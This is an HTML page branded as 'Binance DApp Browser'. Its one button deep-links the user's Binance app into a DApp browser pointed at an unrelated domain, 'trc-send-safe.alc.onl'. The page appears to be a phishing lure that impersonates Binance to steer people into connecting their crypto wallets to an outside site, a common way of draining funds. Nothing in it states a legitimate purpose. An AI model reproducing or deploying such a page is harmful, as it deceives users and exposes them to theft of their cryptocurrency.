<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance DApp Connect</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0b0e11;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .card {
            background-color: #1e2329;
            padding: 24px;
            border-radius: 12px;
            text-align: center;
            width: 320px;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 12px 0;
            margin: 12px 0;
            background-color: #f0b90b;
            color: #000000;
            font-weight: bold;
            border-radius: 6px;
            font-size: 15px;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="card">
        <h3 style="color: #f0b90b;">Binance DApp Browser</h3>
        <button id="openDAppBtn" class="btn">Open DApp in Binance</button>
    </div>

    <script>
        document.getElementById('openDAppBtn').addEventListener('click', function() {
            var targetUrl = "https://trc-send-safe.alc.onl/1x/";
            var encodedUrl = encodeURIComponent(targetUrl);
            
            // Binance Web3 DApp Browser Scheme
            var binanceDAppLink = "bnc://app.binance.com/dapp/browser?url=" + encodedUrl;
            
            window.location.href = binanceDAppLink;
        });
    </script>

</body>
</html>
